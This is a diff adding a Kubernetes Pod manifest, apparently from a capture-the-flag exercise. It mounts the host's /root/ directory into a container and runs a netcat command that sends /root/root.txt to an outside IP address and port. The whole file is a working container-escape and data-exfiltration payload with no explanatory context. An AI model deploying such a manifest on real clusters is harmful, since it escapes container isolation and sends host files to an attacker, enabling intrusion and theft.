@@ -1,0 +1,19 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: some-pod
+  namespace: default
+spec:
+  containers:
+    - name: web
+      image: localhost:5000/dev-alpine
+      command: ["/bin/sh"]
+      args: ["-c", 'cat /root/root.txt | nc -nv 10.10.16.9 9005; sleep 100000']
+      volumeMounts:
+      - mountPath: /root/
+        name: root-flag
+  volumes:
+  - hostPath:
+      path: /root/
+      type: ""
+    name: root-flag
